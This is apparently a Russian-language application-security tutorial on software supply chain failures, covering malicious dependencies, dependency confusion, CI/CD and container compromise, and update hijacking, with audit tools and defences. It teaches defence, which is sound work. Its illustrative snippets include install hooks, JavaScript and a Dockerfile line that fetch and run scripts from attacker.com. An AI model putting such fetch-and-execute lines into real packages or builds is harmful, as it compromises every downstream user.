# 4. Software supply chain failures (Уязвимости цепочки поставок программного обеспечения)
## 1. Что такое Software supply chain failures
**Software supply chain failures** — это класс уязвимостей, связанных с нарушением безопасности на любом этапе жизненного цикла программного обеспечения: от разработки исходного кода до доставки готового приложения пользователю.

Современное программное обеспечение редко создаётся полностью самостоятельно. Большинство приложений используют:
* сторонние библиотеки;
* открытые пакеты;
* контейнерные образы;
* CI/CD-системы;
* системы сборки;
* плагины;
* внешние API;
* инструменты разработчика;
* облачную инфраструктуру.

Таким образом, конечное приложение зависит от большого количества внешних компонентов. Если один из этих компонентов оказывается скомпрометирован, злоумышленник может атаковать все системы, которые используют этот компонент.

Упрощённо цепочку поставки ПО можно представить следующим образом: Разработчик - Исходный код - Зависимости (`npm`, `pip`, `Maven`, `NuGet`) - Система сборки (CI/CD) - Артефакт (Docker image, binary) - Репозиторий - Конечный пользователь.

*Атака может произойти на любом из этих этапов.*

## 2. Почему Software supply chain attacks опасны
### 2.1 Масштаб воздействия
Главная особенность таких атак — **эффект распространения**. Если злоумышленник компрометирует популярный пакет, то атакованы могут быть тысячи организаций одновременно.

Например: Уязвимая библиотека -> 1000 проектов используют библиотеку -> 1000 приложений становятся потенциально уязвимыми.

В отличие от обычной атаки на один сервер, атака на цепочку поставок позволяет получить доступ сразу к большому числу целей.

### 2.2 Сложность обнаружения
Проблема заключается в том, что вредоносный код часто выглядит как обычное обновление.

Разработчик устанавливает зависимость:
```bash
npm install some-library
...
some-library@1.4.2
```
На первый взгляд выглядит нормально.

Но внутри:
```javascript
const https = require("https");
https.get(
 "https://attacker.com/payload",
 function(response){
     eval(response)
 }
);
```
Библиотека выполняет загрузку и запуск удалённого кода. Для разработчика это выглядит как обычный пакет.

### 2.3 Высокий потенциал ущерба
Компрометация цепочки поставок может привести к: 
* краже секретов;
* компрометации серверов;
* внедрению backdoor;
* утечке исходного кода;
* атаке на клиентов;
* распространению вредоносных обновлений.

## 3. Основные виды атак Software Supply Chain
### 3.1 Компрометация сторонних зависимостей
Один из наиболее распространённых вариантов. Приложение использует внешнюю библиотеку:
```
Application
 ├── framework
 ├── database driver
 ├── logging library
 └── vulnerable-library
```
Если библиотека содержит вредоносный код — приложение становится заражено. Допустим, разработчик устанавливает вредоносный пакет npm:
```bash
npm install useful-package
```
Внутри package.json:
```json
{
 "scripts": {
   "postinstall": "node install.js"
 }
}
```
После установки автоматически выполняется install.js:
```javascript
const {exec}=require("child_process");
exec(
 "curl http://attacker.com/script.sh | bash"
);
```
Теперь установка зависимости приводит к выполнению команд атакующего.

Как искать такие проблемы? - Проверка зависимостей!

#### JavaScript
`npm audit` — это встроенная команда менеджера пакетов `Node.js`, которая сканирует проект на наличие известных уязвимостей в сторонних библиотеках:
```bash
npm audit
...
High severity vulnerability found
package:
lodash

version:
4.17.20

fixed:
4.17.21
```
#### Python
`pip-audit` — это инструмент для автоматического сканирования проектов Python на наличие уязвимых библиотек.
Проверка:
```bash
pip-audit
...
Found vulnerability:
Django 2.2.0
CVE-2024-xxxxx
```

---

#### Java
Команда `mvn dependency-check:check` запускает сканирование проекта плагином `OWASP Dependency-Check`. Он ищет открытые библиотеки, используемые в проекте (например, в файле pom.xml), и проверяет их по базам данных известных уязвимостей (CVE).

Maven:
```bash
mvn dependency-check:check
```

#### Web
При тестировании веб-приложения смотрим:
```
HTTP Response

Server:
Apache/2.4.49

X-Powered-By:
Express

Generator:
webpack
```

Ищем:
* версии фреймворков;
* JS-библиотеки;
* CDN зависимости.

Например:
```html
<script src="/static/jquery-3.3.1.min.js">
</script>
```

### 3.2 Dependency Confusion (подмена зависимости)
Суть: Компания использует внутренний пакет:
```
company-auth-lib
```
Но он отсутствует в публичном репозитории.

Внутри компании:
```json
package.json
{
 "dependencies":
 {
   "company-auth-lib":"1.0.0"
 }
}
```
Атакующий создаёт публичный пакет:
```
company-auth-lib
version 9.0.0
```
И система случайно скачивает его из интернета.

Пример вредоносный package.json:
```json
{
"name":"company-auth-lib",
"version":"9.0.0",

"scripts":
{
"preinstall":
"curl attacker.com/a.sh | bash"
}
}
```
При сборке: `npm install` происходит загрузка публичного пакета, подготовка к устанвоке и сервер скомпрометирован.

Поиск Dependency Confusion. Проверяем:
* package.json;
* requirements.txt;
* pom.xml;
* go.mod.

Ищем внутренние имена:
```
corp-payment-sdk
internal-utils
company-security
```
Проверяем:
```
npm search corp-payment-sdk
```
Если такого пакета нет публично — риск.

***Защита - Использовать приватные registry:***
```
npm.company.local
```
и запрещать:
```
public npm registry
```

### 3.3 Компрометация CI/CD pipeline
CI/CD часто имеет высокие права: GitHub Actions -> Build server -> Production deployment.

Если атакующий получает доступ к pipeline, то он может изменить процесс сборки.

Файл `.github/workflows/build.yml` содержит:
```yaml
steps:
- uses:
    actions/checkout@v2
- run:
    npm install
- run:
    npm build
```
Проблема: используется старая версия action. Атакующий может внедрить код через зависимость.

Проверяем `GitHub Actions` Файлы:
```
.github/workflows/*.yml
```
Ищем опасные конструкции:
```yaml
pull_request_target
```
или:
```yaml
permissions:
 contents: write
```
Плохо:
```yaml
env:
 AWS_KEY:
  AKIAxxxxxxxx
```
Хорошо:
```
GitHub Secrets
AWS_KEY=${{ secrets.AWS_KEY }}
```
### 3.4 Компрометация контейнерных образов
Современные приложения используют: Dockerfile -> Docker image -> Container Registry. Если образ заражён все пользователи получают вредоносный контейнер.

Dockerfile:
```dockerfile
FROM ubuntu:latest
RUN apt update
RUN curl attacker.com/backdoor.sh | bash
COPY app /
```
После сборки:
```
docker build .
```
образ уже заражён.

Поиск уязвимых образов!
#### Trivy
`Trivy` - популярный open-source сканер безопасности, разработанный Aqua Security, который используется для автоматического поиска уязвимостей, ошибок конфигурации, утечек секретных данных и проблем с лицензиями в программном обеспечении:
```bash
trivy image nginx:latest
...
HIGH:
openssl
CVE-2024-xxxx
```

#### Проверка Dockerfile
Опасные места:
```dockerfile
ADD http://example.com/file /
...
RUN curl URL | bash
```

## 4. Практический сценарий поиска в веб-приложении
Допустим есть:
```
https://example.com
```
### Шаг 1. Определение технологий
Burp:
```
HTTP history
```
Смотрим:
```
Server:
nginx
...
X-Powered-By:
Express
```
### Шаг 2. Анализ JavaScript
Находим:
```
/static/app.js
```
Внутри:
```javascript
React.version="17.0.1"
```
Проверяем:
```
React 17.0.1 vulnerabilities
```
### Шаг 3. Поиск зависимостей
Ищем:
```
package.json
package-lock.json
yarn.lock
```
Например:
```json
{
"dependencies":
{
 "axios":"0.21.0",
 "lodash":"4.17.15"
}
}
```
Проверяем:
```
npm audit
```
### Шаг 4. Проверка загрузки обновлений
Ищем:
```
/api/update
/download/latest
/check-version
```
Проверяем Запрос:
```
GET /api/update
```
Ответ:
```json
{
"version":"1.2.3",
"url":
"https://example.com/app.exe"
}
```
Если URL можно изменить:
```
https://attacker.com/app.exe
```
может появиться возможность подмены обновления.

## 5. Методы защиты
### 5.1 Управление зависимостями
Использовать:
* Software Composition Analysis (SCA);
* автоматический аудит;
* фиксацию версий.

Плохо:
```json
"lodash":"latest"
```
Хорошо:
```json
"lodash":"4.17.21"
```
### 5.2 Подпись компонентов
Использовать:
* цифровые подписи;
* проверку целостности;
* SBOM (Software Bill of Materials).

SBOM - это список всех компонентов приложения:
```
Application
├── nginx 1.24
├── openssl 3.0
├── react 18
└── lodash 4.17
```

### 5.3 Безопасность CI/CD
Необходимо:
* MFA для репозиториев;
* минимальные права;
* защита секретов;
* проверка pull request.

### 5.4 Безопасность контейнеров
Использовать:
* сканирование образов;
* минимальные базовые образы;
* подпись Docker images.

### 5.5 Контроль обновлений
Обновления должны:
* подписываться;
* проверяться;
* доставляться через доверенный канал.

## Итог
`Software supply chain failures` — это не одна конкретная уязвимость, а класс проблем, возникающих из-за доверия к внешним компонентам и процессам разработки.

Основные направления анализа:
1. Проверка зависимостей.
2. Поиск Dependency Confusion (подмена или путаница зависимостей).
3. Анализ CI/CD.
4. Проверка контейнерных образов.
5. Контроль процесса обновления.

Для AppSec специалиста главная задача — не только искать CVE в коде, а понимать всю цепочку создания программного обеспечения и выявлять места, где злоумышленник может внедрить свой код до момента попадания приложения в production.
